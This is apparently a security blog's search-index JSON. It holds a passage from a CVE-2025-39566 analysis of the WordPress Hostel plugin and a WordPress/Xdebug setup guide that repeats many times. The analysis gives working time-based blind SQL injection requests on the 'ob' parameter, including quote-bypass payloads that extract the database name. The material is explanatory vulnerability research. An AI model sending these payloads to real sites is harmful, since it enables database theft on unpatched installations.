'view': // view handle break; // list bookings default: // another logic if(!empty($_GET['ob'])) { $orderby = \"ORDER BY \".sanitize_text_field($_GET['ob']) . ' ' . $dir; } $bookings = $wpdb-\u003eget_results(\"SELECT SQL_CALC_FOUND_ROWS tB.*, tR.title as room FROM \".WPHOSTEL_BOOKINGS.\" tB JOIN \".WPHOSTEL_ROOMS.\" tR ON tR.id = tB.room_id WHERE is_static=0 $where_sql $orderby $limit_sql\"); // another logic break; } } } In WordPress, plugins communicate with core via the Plugin API (Hook System). Therefore, to find where manage() is invoked, we can search for the string \"manage\" in the plugin folder. Search\rIn the file models/hostel.php we have: class class WPHostel { // another logic static function menu() { // we use 'hostelpro_manage' for consistency with the pro version $wphostel_caps = current_user_can('manage_options') ? 'manage_options' : 'hostelpro_manage'; add_menu_page(__('Hostel', 'wphostel'), __('Hostel', 'wphostel'), $wphostel_caps, \"wphostel_options\", array(__CLASS__, \"options\")); add_submenu_page('wphostel_options', __('Settings', 'wphostel'), __('Settings', 'wphostel'), $wphostel_caps, \"wphostel_options\", array(__CLASS__, \"options\")); add_submenu_page('wphostel_options', __(\"Manage Rooms\", 'wphostel'), __(\"Manage Rooms\", 'wphostel'), $wphostel_caps, 'wphostel_rooms', array('WPHostelRooms', \"manage\")); add_submenu_page('wphostel_options', __(\"Manage Bookings\", 'wphostel'), __(\"Manage Bookings\", 'wphostel'), $wphostel_caps, 'wphostel_bookings', array('WPHostelBookings', \"manage\")); add_submenu_page('wphostel_options', __(\"Unavailable Dates\", 'wphostel'), __(\"Unavailable Dates\", 'wphostel'), $wphostel_caps, 'wphostel_unavailable', array('WPHostelBookings', \"unavailable\")); add_submenu_page('wphostel_options', __(\"Email Log\", 'wphostel'), __(\"Email Log\", 'wphostel'), $wphostel_caps, 'wphostel_emaillog', array('WPHostelHelp', \"email_log\")); add_submenu_page('wphostel_options', __(\"Help\", 'wphostel'), __(\"Help\", 'wphostel'), $wphostel_caps, 'wphostel_help', array('WPHostelHelp', \"index\")); } // another logic } Here: add_menu_page() creates the main menu in the Admin Dashboard. add_submenu_page() adds submenu items under that menu. The $callback parameter is the callback function invoked when a user clicks the menu/submenu. Example: // add_menu_page($page_title, $menu_title, $capability, $menu_slug, $callback = '', $icon_url = '', $position = null); add_menu_page(__('Hostel', 'wphostel'), __('Hostel', 'wphostel'), $wphostel_caps, \"wphostel_options\", array(__CLASS__, \"options\")); // add_submenu_page($parent_slug, $page_title, $menu_title, $capability, $menu_slug, $callback = ''); add_submenu_page('wphostel_options', __(\"Manage Bookings\", 'wphostel'), __(\"Manage Bookings\", 'wphostel'), $wphostel_caps, 'wphostel_bookings', array('WPHostelBookings', \"manage\")); // array('WPHostelBookings', \"manage\")); =\u003e WPHostelBookings::manage() All these menu/submenu items are registered inside the static menu() method of the WPHostel class. To locate where menu() is called, search for the menu hook in the plugin directory. Search menu\rIn the plugin root file hostel.php we have: add_action('admin_menu', array(\"WPHostel\", \"menu\")); // =\u003e callback: WPHostel::menu() add_action() is the WordPress Plugin API that attaches a callback to an action hook. The hook name ","date":"2025-09-21","objectID":"/posts/2025-09-21-cve-2025-39566/:2:2","tags":["analyst","plugin","sqli"],"title":"CVE-2025-39566 Analysis \u0026 POC","uri":"/posts/2025-09-21-cve-2025-39566/#how-it-works"},{"categories":["CVE Analysis"],"collections":null,"content":"Exploit\r","date":"2025-09-21","objectID":"/posts/2025-09-21-cve-2025-39566/:3:0","tags":["analyst","plugin","sqli"],"title":"CVE-2025-39566 Analysis \u0026 POC","uri":"/posts/2025-09-21-cve-2025-39566/#exploit"},{"categories":["CVE Analysis"],"collections":null,"content":"Detecting SQLi\rRequest with BurpSuite: GET /wp-admin/admin.php?page=wphostel_bookings\u0026type=upcoming\u0026ob=tB.status,(SELECT+SLEEP(10))\u0026dir=ASC HTTP/1.1 We separate the ORDER BY clause with a comma because it accepts multi-column values. Detecting SQLi\rResult: the response time is delayed → SQL Injection succeeded. ","date":"2025-09-21","objectID":"/posts/2025-09-21-cve-2025-39566/:3:1","tags":["analyst","plugin","sqli"],"title":"CVE-2025-39566 Analysis \u0026 POC","uri":"/posts/2025-09-21-cve-2025-39566/#detecting-sqli"},{"categories":["CVE Analysis"],"collections":null,"content":"Dumping Data from the Database\rBypass ' using ORD(): To dump database data we need to extract characters such as the first character of the database name. Because sanitize_text_field() removes single quotes ('), we cannot use payloads relying on '. Instead, use ORD() to compare character ASCII codes: GET /wp-admin/admin.php?page=wphostel_bookings\u0026type=past\u0026ob=tB.status,(SELECT+IF(ORD(SUBSTRING(DATABASE(),1,1))=119,SLEEP(5),0))\u0026dir=ASC HTTP/1.1 Bypass succeeds → we can extract the database name. Dumping Data from the Database\rBypass ' using Hex encoding (alternative) Besides ORD() we can use Hex encoding to bypass: GET /wp-admin/admin.php?page=wphostel_bookings\u0026type=past\u0026ob=tB.status,(SELECT+IF(SUBSTRING(DATABASE(),1,1)=0x77,SLEEP(5),0))\u0026dir=ASC HTTP/1.1 Bypass succeeds → database name can be extracted. Bypass succeeds\r","date":"2025-09-21","objectID":"/posts/2025-09-21-cve-2025-39566/:3:2","tags":["analyst","plugin","sqli"],"title":"CVE-2025-39566 Analysis \u0026 POC","uri":"/posts/2025-09-21-cve-2025-39566/#dumping-data-from-the-database"},{"categories":["CVE Analysis"],"collections":null,"content":"Conclusion\rThe vulnerability CVE-2025-39566 in the WordPress Hostel plugin (versions prior to 1.1.5.7) stems from inserting user-supplied input directly into an SQL query without adequate safeguards, leading to SQL Injection. Key takeaways: sanitize_text_field() ≠ protection against SQL Injection Distinguish clearly between input cleaning for HTML contexts and validation/sanitization for SQL contexts ","date":"2025-09-21","objectID":"/posts/2025-09-21-cve-2025-39566/:4:0","tags":["analyst","plugin","sqli"],"title":"CVE-2025-39566 Analysis \u0026 POC","uri":"/posts/2025-09-21-cve-2025-39566/#conclusion"},{"categories":["CVE Analysis"],"collections":null,"content":"References\rSQL Injection Cheat Sheet – PortSwigger WordPress Hostel Plugin \u003c= 1.1.5.6 is vulnerable to SQL Injection - patchstack ","date":"2025-09-21","objectID":"/posts/2025-09-21-cve-2025-39566/:5:0","tags":["analyst","plugin","sqli"],"title":"CVE-2025-39566 Analysis \u0026 POC","uri":"/posts/2025-09-21-cve-2025-39566/#references"},{"categories":["Web"],"collections":null,"content":"A powerful and the most popular content management system (CMS).","date":"2025-08-21","objectID":"/posts/2025-08-21-wordpress-local-and-debugging/","tags":["cms","php","wordpress"],"title":"WordPress Local and Debugging","uri":"/posts/2025-08-21-wordpress-local-and-debugging/"},{"categories":["Web"],"collections":null,"content":"WordPress is a powerful and the most popular content management system (CMS) that allows you to easily create, manage, and customize websites and blogs. It is an open-source CMS, built on PHP and using either MySQL or MariaDB. Released in 2003, initially just for blogging, then evolved into a platform for building websites, online stores, forums, landing pages, etc. Today, more than 40% of websites worldwide run on WordPress. There are two versions of WordPress: WordPress.com Hosting service provided by Automattic You just register an account, no installation needed Limited customization; advanced features require payment WordPress.org Open source, you download and install it on your own hosting/server Fully customizable: install plugins, themes, write code, and build any type of website ","date":"2025-08-21","objectID":"/posts/2025-08-21-wordpress-local-and-debugging/:0:0","tags":["cms","php","wordpress"],"title":"WordPress Local and Debugging","uri":"/posts/2025-08-21-wordpress-local-and-debugging/#"},{"categories":["Web"],"collections":null,"content":"Ecosystem\rCore: the main CMS Plugins: add-on software that extends WordPress functionality with new features Themes: add-on software that defines the visual appearance and layout of a WordPress site ","date":"2025-08-21","objectID":"/posts/2025-08-21-wordpress-local-and-debugging/:1:0","tags":["cms","php","wordpress"],"title":"WordPress Local and Debugging","uri":"/posts/2025-08-21-wordpress-local-and-debugging/#ecosystem"},{"categories":["Web"],"collections":null,"content":"Why WordPress Hacking?\rState of WordPress Security in 2024 ","date":"2025-08-21","objectID":"/posts/2025-08-21-wordpress-local-and-debugging/:2:0","tags":["cms","php","wordpress"],"title":"WordPress Local and Debugging","uri":"/posts/2025-08-21-wordpress-local-and-debugging/#why-wordpress-hacking"},{"categories":["Web"],"collections":null,"content":"Most Popular\rCurrently, more than 40% of websites worldwide run on WordPress This means hackers only need to find one common vulnerability =\u003e they can exploit millions of sites at once Similar to the saying: “fish where the fish are” ","date":"2025-08-21","objectID":"/posts/2025-08-21-wordpress-local-and-debugging/:2:1","tags":["cms","php","wordpress"],"title":"WordPress Local and Debugging","uri":"/posts/2025-08-21-wordpress-local-and-debugging/#most-popular"},{"categories":["Web"],"collections":null,"content":"Plugins and Themes\rWordPress Core has been reviewed for a long time by thousands of developers and researchers, making it very difficult for attackers to compromise directly. However, there are tens of thousands of plugins and themes from various sources with inconsistent quality. Many plugins have poor security coding and are outdated. Hackers just need to scan for outdated versions and exploit them. ","date":"2025-08-21","objectID":"/posts/2025-08-21-wordpress-local-and-debugging/:2:2","tags":["cms","php","wordpress"],"title":"WordPress Local and Debugging","uri":"/posts/2025-08-21-wordpress-local-and-debugging/#plugins-and-themes"},{"categories":["Web"],"collections":null,"content":"Setup WordPress for Hacking\rThere are many ways to set up WordPress; searching Google will provide plenty of guides. Here I will set it up on an Ubuntu (22.04) virtual machine: Does not affect real machine services WordPress is relatively lightweight and works well on a VM ","date":"2025-08-21","objectID":"/posts/2025-08-21-wordpress-local-and-debugging/:3:0","tags":["cms","php","wordpress"],"title":"WordPress Local and Debugging","uri":"/posts/2025-08-21-wordpress-local-and-debugging/#setup-wordpress-for-hacking"},{"categories":["Web"],"collections":null,"content":"Install and Configure WordPress\rInstall Dependencies\rInstall the full stack required to run WordPress (web server + database + PHP + important extensions): sudo apt install -y apache2 \\ ghostscript \\ libapache2-mod-php \\ mysql-server \\ php \\ php-bcmath \\ php-curl \\ php-imagick \\ php-intl \\ php-json \\ php-mbstring \\ php-mysql \\ php-xml \\ php-zip Install WordPress\rDownload and install WordPress source into the web directory: # Create folder to store site source code sudo mkdir -p /srv/www # Change ownership to www-data (default user for Apache/Nginx) sudo chown www-data: /srv/www # Download the latest WordPress package and extract it into /srv/www curl https://wordpress.org/latest.tar.gz | sudo -u www-data tar zx -C /srv/www Download a specific version: curl https://wordpress.org/wordpress-6.6.2.tar.gz | sudo -u www-data tar zx -C /srv/www Installing from wordpress.org is the most reliable and safest approach: Ubuntu has a wordpress package in its repository, but it is often outdated compared to the official release. The WordPress community only supports installations from the official source. Configure Apache for WordPress\rCreate \u0026 edit /etc/apache2/sites-available/wordpress.conf: sudo nano /etc/apache2/sites-available/wordpress.conf Paste the following content in: \u003cVirtualHost *:80\u003e DocumentRoot /srv/www/wordpress \u003cDirectory /srv/www/wordpress\u003e Options FollowSymLinks AllowOverride Limit Options FileInfo DirectoryIndex index.php Require all granted \u003c/Directory\u003e \u003cDirectory /srv/www/wordpress/wp-content\u003e Options FollowSymLinks Require all granted \u003c/Directory\u003e \u003c/VirtualHost\u003e Enable the site: sudo a2ensite wordpress Enable rewrite module: sudo a2enmod rewrite (Optional) Disable default site: sudo a2dissite 000-default Reload Apache: sudo service apache2 reload Configure Database\rsudo mysql -u root CREATE DATABASE wordpress; CREATE USER wordpress@localhost IDENTIFIED BY '\u003cyour-password\u003e'; GRANT SELECT,INSERT,UPDATE,DELETE,CREATE,DROP,ALTER ON wordpress.* TO wordpress@localhost; FLUSH PRIVILEGES; quit Restart MySQL: sudo service mysql start Configure WordPress to Connect to the Database\rCopy config file: sudo -u www-data cp /srv/www/wordpress/wp-config-sample.php /srv/www/wordpress/wp-config.php Edit database info: sudo -u www-data sed -i 's/database_name_here/wordpress/' /srv/www/wordpress/wp-config.php sudo -u www-data sed -i 's/username_here/wordpress/' /srv/www/wordpress/wp-config.php sudo -u www-data sed -i 's/password_here/\u003cyour-password\u003e/' /srv/www/wordpress/wp-config.php Add secret keys and salts from: https://api.wordpress.org/secret-key/1.1/salt/ sudo nano /srv/www/wordpress/wp-config.php Configure WordPress\rVisit http://localhost and set site title, username, password, and admin email. ","date":"2025-08-21","objectID":"/posts/2025-08-21-wordpress-local-and-debugging/:3:1","tags":["cms","php","wordpress"],"title":"WordPress Local and Debugging","uri":"/posts/2025-08-21-wordpress-local-and-debugging/#install-and-configure-wordpress"},{"categories":["Web"],"collections":null,"content":"Install and Configure WordPress\rInstall Dependencies\rInstall the full stack required to run WordPress (web server + database + PHP + important extensions): sudo apt install -y apache2 \\ ghostscript \\ libapache2-mod-php \\ mysql-server \\ php \\ php-bcmath \\ php-curl \\ php-imagick \\ php-intl \\ php-json \\ php-mbstring \\ php-mysql \\ php-xml \\ php-zip Install WordPress\rDownload and install WordPress source into the web directory: # Create folder to store site source code sudo mkdir -p /srv/www # Change ownership to www-data (default user for Apache/Nginx) sudo chown www-data: /srv/www # Download the latest WordPress package and extract it into /srv/www curl https://wordpress.org/latest.tar.gz | sudo -u www-data tar zx -C /srv/www Download a specific version: curl https://wordpress.org/wordpress-6.6.2.tar.gz | sudo -u www-data tar zx -C /srv/www Installing from wordpress.org is the most reliable and safest approach: Ubuntu has a wordpress package in its repository, but it is often outdated compared to the official release. The WordPress community only supports installations from the official source. Configure Apache for WordPress\rCreate \u0026 edit /etc/apache2/sites-available/wordpress.conf: sudo nano /etc/apache2/sites-available/wordpress.conf Paste the following content in: DocumentRoot /srv/www/wordpress Options FollowSymLinks AllowOverride Limit Options FileInfo DirectoryIndex index.php Require all granted Options FollowSymLinks Require all granted Enable the site: sudo a2ensite wordpress Enable rewrite module: sudo a2enmod rewrite (Optional) Disable default site: sudo a2dissite 000-default Reload Apache: sudo service apache2 reload Configure Database\rsudo mysql -u root CREATE DATABASE wordpress; CREATE USER wordpress@localhost IDENTIFIED BY ''; GRANT SELECT,INSERT,UPDATE,DELETE,CREATE,DROP,ALTER ON wordpress.* TO wordpress@localhost; FLUSH PRIVILEGES; quit Restart MySQL: sudo service mysql start Configure WordPress to Connect to the Database\rCopy config file: sudo -u www-data cp /srv/www/wordpress/wp-config-sample.php /srv/www/wordpress/wp-config.php Edit database info: sudo -u www-data sed -i 's/database_name_here/wordpress/' /srv/www/wordpress/wp-config.php sudo -u www-data sed -i 's/username_here/wordpress/' /srv/www/wordpress/wp-config.php sudo -u www-data sed -i 's/password_here//' /srv/www/wordpress/wp-config.php Add secret keys and salts from: https://api.wordpress.org/secret-key/1.1/salt/ sudo nano /srv/www/wordpress/wp-config.php Configure WordPress\rVisit http://localhost and set site title, username, password, and admin email. ","date":"2025-08-21","objectID":"/posts/2025-08-21-wordpress-local-and-debugging/:3:1","tags":["cms","php","wordpress"],"title":"WordPress Local and Debugging","uri":"/posts/2025-08-21-wordpress-local-and-debugging/#install-dependencies"},{"categories":["Web"],"collections":null,"content":"Install and Configure WordPress\rInstall Dependencies\rInstall the full stack required to run WordPress (web server + database + PHP + important extensions): sudo apt install -y apache2 \\ ghostscript \\ libapache2-mod-php \\ mysql-server \\ php \\ php-bcmath \\ php-curl \\ php-imagick \\ php-intl \\ php-json \\ php-mbstring \\ php-mysql \\ php-xml \\ php-zip Install WordPress\rDownload and install WordPress source into the web directory: # Create folder to store site source code sudo mkdir -p /srv/www # Change ownership to www-data (default user for Apache/Nginx) sudo chown www-data: /srv/www # Download the latest WordPress package and extract it into /srv/www curl https://wordpress.org/latest.tar.gz | sudo -u www-data tar zx -C /srv/www Download a specific version: curl https://wordpress.org/wordpress-6.6.2.tar.gz | sudo -u www-data tar zx -C /srv/www Installing from wordpress.org is the most reliable and safest approach: Ubuntu has a wordpress package in its repository, but it is often outdated compared to the official release. The WordPress community only supports installations from the official source. Configure Apache for WordPress\rCreate \u0026 edit /etc/apache2/sites-available/wordpress.conf: sudo nano /etc/apache2/sites-available/wordpress.conf Paste the following content in: DocumentRoot /srv/www/wordpress Options FollowSymLinks AllowOverride Limit Options FileInfo DirectoryIndex index.php Require all granted Options FollowSymLinks Require all granted Enable the site: sudo a2ensite wordpress Enable rewrite module: sudo a2enmod rewrite (Optional) Disable default site: sudo a2dissite 000-default Reload Apache: sudo service apache2 reload Configure Database\rsudo mysql -u root CREATE DATABASE wordpress; CREATE USER wordpress@localhost IDENTIFIED BY ''; GRANT SELECT,INSERT,UPDATE,DELETE,CREATE,DROP,ALTER ON wordpress.* TO wordpress@localhost; FLUSH PRIVILEGES; quit Restart MySQL: sudo service mysql start Configure WordPress to Connect to the Database\rCopy config file: sudo -u www-data cp /srv/www/wordpress/wp-config-sample.php /srv/www/wordpress/wp-config.php Edit database info: sudo -u www-data sed -i 's/database_name_here/wordpress/' /srv/www/wordpress/wp-config.php sudo -u www-data sed -i 's/username_here/wordpress/' /srv/www/wordpress/wp-config.php sudo -u www-data sed -i 's/password_here//' /srv/www/wordpress/wp-config.php Add secret keys and salts from: https://api.wordpress.org/secret-key/1.1/salt/ sudo nano /srv/www/wordpress/wp-config.php Configure WordPress\rVisit http://localhost and set site title, username, password, and admin email. ","date":"2025-08-21","objectID":"/posts/2025-08-21-wordpress-local-and-debugging/:3:1","tags":["cms","php","wordpress"],"title":"WordPress Local and Debugging","uri":"/posts/2025-08-21-wordpress-local-and-debugging/#install-wordpress"},{"categories":["Web"],"collections":null,"content":"Install and Configure WordPress\rInstall Dependencies\rInstall the full stack required to run WordPress (web server + database + PHP + important extensions): sudo apt install -y apache2 \\ ghostscript \\ libapache2-mod-php \\ mysql-server \\ php \\ php-bcmath \\ php-curl \\ php-imagick \\ php-intl \\ php-json \\ php-mbstring \\ php-mysql \\ php-xml \\ php-zip Install WordPress\rDownload and install WordPress source into the web directory: # Create folder to store site source code sudo mkdir -p /srv/www # Change ownership to www-data (default user for Apache/Nginx) sudo chown www-data: /srv/www # Download the latest WordPress package and extract it into /srv/www curl https://wordpress.org/latest.tar.gz | sudo -u www-data tar zx -C /srv/www Download a specific version: curl https://wordpress.org/wordpress-6.6.2.tar.gz | sudo -u www-data tar zx -C /srv/www Installing from wordpress.org is the most reliable and safest approach: Ubuntu has a wordpress package in its repository, but it is often outdated compared to the official release. The WordPress community only supports installations from the official source. Configure Apache for WordPress\rCreate \u0026 edit /etc/apache2/sites-available/wordpress.conf: sudo nano /etc/apache2/sites-available/wordpress.conf Paste the following content in: DocumentRoot /srv/www/wordpress Options FollowSymLinks AllowOverride Limit Options FileInfo DirectoryIndex index.php Require all granted Options FollowSymLinks Require all granted Enable the site: sudo a2ensite wordpress Enable rewrite module: sudo a2enmod rewrite (Optional) Disable default site: sudo a2dissite 000-default Reload Apache: sudo service apache2 reload Configure Database\rsudo mysql -u root CREATE DATABASE wordpress; CREATE USER wordpress@localhost IDENTIFIED BY ''; GRANT SELECT,INSERT,UPDATE,DELETE,CREATE,DROP,ALTER ON wordpress.* TO wordpress@localhost; FLUSH PRIVILEGES; quit Restart MySQL: sudo service mysql start Configure WordPress to Connect to the Database\rCopy config file: sudo -u www-data cp /srv/www/wordpress/wp-config-sample.php /srv/www/wordpress/wp-config.php Edit database info: sudo -u www-data sed -i 's/database_name_here/wordpress/' /srv/www/wordpress/wp-config.php sudo -u www-data sed -i 's/username_here/wordpress/' /srv/www/wordpress/wp-config.php sudo -u www-data sed -i 's/password_here//' /srv/www/wordpress/wp-config.php Add secret keys and salts from: https://api.wordpress.org/secret-key/1.1/salt/ sudo nano /srv/www/wordpress/wp-config.php Configure WordPress\rVisit http://localhost and set site title, username, password, and admin email. ","date":"2025-08-21","objectID":"/posts/2025-08-21-wordpress-local-and-debugging/:3:1","tags":["cms","php","wordpress"],"title":"WordPress Local and Debugging","uri":"/posts/2025-08-21-wordpress-local-and-debugging/#configure-apache-for-wordpress"},{"categories":["Web"],"collections":null,"content":"Install and Configure WordPress\rInstall Dependencies\rInstall the full stack required to run WordPress (web server + database + PHP + important extensions): sudo apt install -y apache2 \\ ghostscript \\ libapache2-mod-php \\ mysql-server \\ php \\ php-bcmath \\ php-curl \\ php-imagick \\ php-intl \\ php-json \\ php-mbstring \\ php-mysql \\ php-xml \\ php-zip Install WordPress\rDownload and install WordPress source into the web directory: # Create folder to store site source code sudo mkdir -p /srv/www # Change ownership to www-data (default user for Apache/Nginx) sudo chown www-data: /srv/www # Download the latest WordPress package and extract it into /srv/www curl https://wordpress.org/latest.tar.gz | sudo -u www-data tar zx -C /srv/www Download a specific version: curl https://wordpress.org/wordpress-6.6.2.tar.gz | sudo -u www-data tar zx -C /srv/www Installing from wordpress.org is the most reliable and safest approach: Ubuntu has a wordpress package in its repository, but it is often outdated compared to the official release. The WordPress community only supports installations from the official source. Configure Apache for WordPress\rCreate \u0026 edit /etc/apache2/sites-available/wordpress.conf: sudo nano /etc/apache2/sites-available/wordpress.conf Paste the following content in: DocumentRoot /srv/www/wordpress Options FollowSymLinks AllowOverride Limit Options FileInfo DirectoryIndex index.php Require all granted Options FollowSymLinks Require all granted Enable the site: sudo a2ensite wordpress Enable rewrite module: sudo a2enmod rewrite (Optional) Disable default site: sudo a2dissite 000-default Reload Apache: sudo service apache2 reload Configure Database\rsudo mysql -u root CREATE DATABASE wordpress; CREATE USER wordpress@localhost IDENTIFIED BY ''; GRANT SELECT,INSERT,UPDATE,DELETE,CREATE,DROP,ALTER ON wordpress.* TO wordpress@localhost; FLUSH PRIVILEGES; quit Restart MySQL: sudo service mysql start Configure WordPress to Connect to the Database\rCopy config file: sudo -u www-data cp /srv/www/wordpress/wp-config-sample.php /srv/www/wordpress/wp-config.php Edit database info: sudo -u www-data sed -i 's/database_name_here/wordpress/' /srv/www/wordpress/wp-config.php sudo -u www-data sed -i 's/username_here/wordpress/' /srv/www/wordpress/wp-config.php sudo -u www-data sed -i 's/password_here//' /srv/www/wordpress/wp-config.php Add secret keys and salts from: https://api.wordpress.org/secret-key/1.1/salt/ sudo nano /srv/www/wordpress/wp-config.php Configure WordPress\rVisit http://localhost and set site title, username, password, and admin email. ","date":"2025-08-21","objectID":"/posts/2025-08-21-wordpress-local-and-debugging/:3:1","tags":["cms","php","wordpress"],"title":"WordPress Local and Debugging","uri":"/posts/2025-08-21-wordpress-local-and-debugging/#configure-database"},{"categories":["Web"],"collections":null,"content":"Install and Configure WordPress\rInstall Dependencies\rInstall the full stack required to run WordPress (web server + database + PHP + important extensions): sudo apt install -y apache2 \\ ghostscript \\ libapache2-mod-php \\ mysql-server \\ php \\ php-bcmath \\ php-curl \\ php-imagick \\ php-intl \\ php-json \\ php-mbstring \\ php-mysql \\ php-xml \\ php-zip Install WordPress\rDownload and install WordPress source into the web directory: # Create folder to store site source code sudo mkdir -p /srv/www # Change ownership to www-data (default user for Apache/Nginx) sudo chown www-data: /srv/www # Download the latest WordPress package and extract it into /srv/www curl https://wordpress.org/latest.tar.gz | sudo -u www-data tar zx -C /srv/www Download a specific version: curl https://wordpress.org/wordpress-6.6.2.tar.gz | sudo -u www-data tar zx -C /srv/www Installing from wordpress.org is the most reliable and safest approach: Ubuntu has a wordpress package in its repository, but it is often outdated compared to the official release. The WordPress community only supports installations from the official source. Configure Apache for WordPress\rCreate \u0026 edit /etc/apache2/sites-available/wordpress.conf: sudo nano /etc/apache2/sites-available/wordpress.conf Paste the following content in: DocumentRoot /srv/www/wordpress Options FollowSymLinks AllowOverride Limit Options FileInfo DirectoryIndex index.php Require all granted Options FollowSymLinks Require all granted Enable the site: sudo a2ensite wordpress Enable rewrite module: sudo a2enmod rewrite (Optional) Disable default site: sudo a2dissite 000-default Reload Apache: sudo service apache2 reload Configure Database\rsudo mysql -u root CREATE DATABASE wordpress; CREATE USER wordpress@localhost IDENTIFIED BY ''; GRANT SELECT,INSERT,UPDATE,DELETE,CREATE,DROP,ALTER ON wordpress.* TO wordpress@localhost; FLUSH PRIVILEGES; quit Restart MySQL: sudo service mysql start Configure WordPress to Connect to the Database\rCopy config file: sudo -u www-data cp /srv/www/wordpress/wp-config-sample.php /srv/www/wordpress/wp-config.php Edit database info: sudo -u www-data sed -i 's/database_name_here/wordpress/' /srv/www/wordpress/wp-config.php sudo -u www-data sed -i 's/username_here/wordpress/' /srv/www/wordpress/wp-config.php sudo -u www-data sed -i 's/password_here//' /srv/www/wordpress/wp-config.php Add secret keys and salts from: https://api.wordpress.org/secret-key/1.1/salt/ sudo nano /srv/www/wordpress/wp-config.php Configure WordPress\rVisit http://localhost and set site title, username, password, and admin email. ","date":"2025-08-21","objectID":"/posts/2025-08-21-wordpress-local-and-debugging/:3:1","tags":["cms","php","wordpress"],"title":"WordPress Local and Debugging","uri":"/posts/2025-08-21-wordpress-local-and-debugging/#configure-wordpress-to-connect-to-the-database"},{"categories":["Web"],"collections":null,"content":"Install and Configure WordPress\rInstall Dependencies\rInstall the full stack required to run WordPress (web server + database + PHP + important extensions): sudo apt install -y apache2 \\ ghostscript \\ libapache2-mod-php \\ mysql-server \\ php \\ php-bcmath \\ php-curl \\ php-imagick \\ php-intl \\ php-json \\ php-mbstring \\ php-mysql \\ php-xml \\ php-zip Install WordPress\rDownload and install WordPress source into the web directory: # Create folder to store site source code sudo mkdir -p /srv/www # Change ownership to www-data (default user for Apache/Nginx) sudo chown www-data: /srv/www # Download the latest WordPress package and extract it into /srv/www curl https://wordpress.org/latest.tar.gz | sudo -u www-data tar zx -C /srv/www Download a specific version: curl https://wordpress.org/wordpress-6.6.2.tar.gz | sudo -u www-data tar zx -C /srv/www Installing from wordpress.org is the most reliable and safest approach: Ubuntu has a wordpress package in its repository, but it is often outdated compared to the official release. The WordPress community only supports installations from the official source. Configure Apache for WordPress\rCreate \u0026 edit /etc/apache2/sites-available/wordpress.conf: sudo nano /etc/apache2/sites-available/wordpress.conf Paste the following content in: DocumentRoot /srv/www/wordpress Options FollowSymLinks AllowOverride Limit Options FileInfo DirectoryIndex index.php Require all granted Options FollowSymLinks Require all granted Enable the site: sudo a2ensite wordpress Enable rewrite module: sudo a2enmod rewrite (Optional) Disable default site: sudo a2dissite 000-default Reload Apache: sudo service apache2 reload Configure Database\rsudo mysql -u root CREATE DATABASE wordpress; CREATE USER wordpress@localhost IDENTIFIED BY ''; GRANT SELECT,INSERT,UPDATE,DELETE,CREATE,DROP,ALTER ON wordpress.* TO wordpress@localhost; FLUSH PRIVILEGES; quit Restart MySQL: sudo service mysql start Configure WordPress to Connect to the Database\rCopy config file: sudo -u www-data cp /srv/www/wordpress/wp-config-sample.php /srv/www/wordpress/wp-config.php Edit database info: sudo -u www-data sed -i 's/database_name_here/wordpress/' /srv/www/wordpress/wp-config.php sudo -u www-data sed -i 's/username_here/wordpress/' /srv/www/wordpress/wp-config.php sudo -u www-data sed -i 's/password_here//' /srv/www/wordpress/wp-config.php Add secret keys and salts from: https://api.wordpress.org/secret-key/1.1/salt/ sudo nano /srv/www/wordpress/wp-config.php Configure WordPress\rVisit http://localhost and set site title, username, password, and admin email. ","date":"2025-08-21","objectID":"/posts/2025-08-21-wordpress-local-and-debugging/:3:1","tags":["cms","php","wordpress"],"title":"WordPress Local and Debugging","uri":"/posts/2025-08-21-wordpress-local-and-debugging/#configure-wordpress"},{"categories":["Web"],"collections":null,"content":"Setup Debug on VSCode\rAdd PHP Debug Extension on VSCode\rGo to Extensions (Ctrl+Shift+X) → search PHP Debug (by Felix Becker) → Install. Install Xdebug on Ubuntu\rsudo apt install php-xdebug -y Check installation: php -v Configure Xdebug\rsudo nano /etc/php/\u003cversion\u003e/apache2/php.ini Append: zend_extension=xdebug.so xdebug.mode=debug xdebug.start_with_request=yes xdebug.client_host=127.0.0.1 xdebug.client_port=9003 Restart Apache: sudo systemctl restart apache2 Configure VSCode launch.json\rOpen WordPress folder in VSCode: code /srv/www/wordpress Create .vscode/launch.json: ","date":"2025-08-21","objectID":"/posts/2025-08-21-wordpress-local-and-debugging/:3:2","tags":["cms","php","wordpress"],"title":"WordPress Local and Debugging","uri":"/posts/2025-08-21-wordpress-local-and-debugging/#setup-debug-on-vscode"},{"categories":["Web"],"collections":null,"content":"Setup Debug on VSCode\rAdd PHP Debug Extension on VSCode\rGo to Extensions (Ctrl+Shift+X) → search PHP Debug (by Felix Becker) → Install. Install Xdebug on Ubuntu\rsudo apt install php-xdebug -y Check installation: php -v Configure Xdebug\rsudo nano /etc/php//apache2/php.ini Append: zend_extension=xdebug.so xdebug.mode=debug xdebug.start_with_request=yes xdebug.client_host=127.0.0.1 xdebug.client_port=9003 Restart Apache: sudo systemctl restart apache2 Configure VSCode launch.json\rOpen WordPress folder in VSCode: code /srv/www/wordpress Create .vscode/launch.json: ","date":"2025-08-21","objectID":"/posts/2025-08-21-wordpress-local-and-debugging/:3:2","tags":["cms","php","wordpress"],"title":"WordPress Local and Debugging","uri":"/posts/2025-08-21-wordpress-local-and-debugging/#add-php-debug-extension-on-vscode"},{"categories":["Web"],"collections":null,"content":"Setup Debug on VSCode\rAdd PHP Debug Extension on VSCode\rGo to Extensions (Ctrl+Shift+X) → search PHP Debug (by Felix Becker) → Install. Install Xdebug on Ubuntu\rsudo apt install php-xdebug -y Check installation: php -v Configure Xdebug\rsudo nano /etc/php//apache2/php.ini Append: zend_extension=xdebug.so xdebug.mode=debug xdebug.start_with_request=yes xdebug.client_host=127.0.0.1 xdebug.client_port=9003 Restart Apache: sudo systemctl restart apache2 Configure VSCode launch.json\rOpen WordPress folder in VSCode: code /srv/www/wordpress Create .vscode/launch.json: ","date":"2025-08-21","objectID":"/posts/2025-08-21-wordpress-local-and-debugging/:3:2","tags":["cms","php","wordpress"],"title":"WordPress Local and Debugging","uri":"/posts/2025-08-21-wordpress-local-and-debugging/#install-xdebug-on-ubuntu"},{"categories":["Web"],"collections":null,"content":"Setup Debug on VSCode\rAdd PHP Debug Extension on VSCode\rGo to Extensions (Ctrl+Shift+X) → search PHP Debug (by Felix Becker) → Install. Install Xdebug on Ubuntu\rsudo apt install php-xdebug -y Check installation: php -v Configure Xdebug\rsudo nano /etc/php//apache2/php.ini Append: zend_extension=xdebug.so xdebug.mode=debug xdebug.start_with_request=yes xdebug.client_host=127.0.0.1 xdebug.client_port=9003 Restart Apache: sudo systemctl 